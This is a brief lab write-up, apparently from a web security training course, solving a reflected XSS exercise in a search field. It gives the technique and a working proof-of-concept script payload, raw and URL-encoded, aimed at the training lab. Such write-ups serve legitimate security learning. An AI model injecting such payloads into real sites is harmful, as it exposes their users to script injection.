# Lab 01: Reflected XSS into HTML context with nothing encoded

**Difficulty:** Apprentice  
**Goal:** Call `alert()` via reflected XSS in the search field

## Vulnerability
The search parameter is reflected directly into the HTML response **without any encoding or filtering**.

## Steps to solve
1. Enter normal search → observe it appears in `<h1>0 search results for 'test'</h1>`
2. Try breaking out of the tag: `<script>alert(1)</script>`
3. Because nothing is encoded → browser executes it → lab solved!

## Working payload (URL-encoded for browser)
?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E


Full URL example:
https://[lab-id].web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E


## Key learning
- If user input goes straight into HTML context with **zero sanitization** → classic reflected XSS is trivial
- Always URL-encode special characters when testing in address bar (`<` → `%3C`, `>` → `%3E`, etc.)

**Solved:** January 13, 2026 🎉